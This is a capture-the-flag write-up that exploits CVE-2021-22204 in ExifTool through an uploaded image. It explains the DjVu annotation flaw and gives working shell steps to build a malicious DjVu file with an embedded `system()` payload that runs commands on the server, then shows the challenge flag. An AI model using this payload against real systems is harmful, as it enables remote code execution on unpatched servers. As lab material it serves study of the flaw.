# Shell
## Introduction
This simple web app lets you upload images to inspect their EXIF metadata. But something feels off… maybe your uploads are being examined more closely than you realize. Can you get the server to execute a command of your choosing and expose the hidden flag.txt file?

Note: Only image uploads are allowed. No brute force needed — just the right approach and format.
## Challenge Resolution
The `ExifTool` Version Number is **12.16**. We use this [exploit](https://ine.com/blog/exiftool-command-injection-cve-2021-22204-exploitation-and-prevention-strategies) of `CVE-2021-22204` affecting versions **7.44** to **12.24**. This vulnerability is a command injection leveraging the way ExifTool handles annotations in DjVu files. The `ParseAnt` function, responsible for **parsing annotations**, fails to properly sanitize user-supplied input before evaluating it as code.
#### What is DjVu?
DjVu is a file format mainly oriented towards the storage of the scanned text, graphic, and color photographs and images. It was developed by AT&T Labs in 1996 and serves as a less bulky type of document compared to PDF because high-quality scanned pictures can be converted and compressed into small-sized files without any loss of clarity.
#### Crafting the payload
Using **\c** followed by a character to introduce control characters we may bypass the sanitization routine.
```sh
# Creating a text file containing the payload
nano payload                                                    

# The payload to list the current, parent and root directories
(metadata "\c${system('ls; echo 1; ls .. ; echo 1; ls /')};")

# Compress data, making the payload less conspicuous
bzz payload payload.bzz                                         

# Create the DjVu file with the compressed payload
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```
- `INFO='1,1'`:  Basic page information.
- `BGjp=/dev/null`: No background image.
- `ANTz=payload.bzz`: Include the compressed annotation.

```sh
# Confirm the file type
file exploit.djvu

exploit.djvu: DjVu image or single page document
```
We can then send this file to be evaluated by ExifTool on the server, we can then find and print the flag:
```flag
0xfun{h1dd3n_p4yl04d_1n_pl41n_51gh7}
```
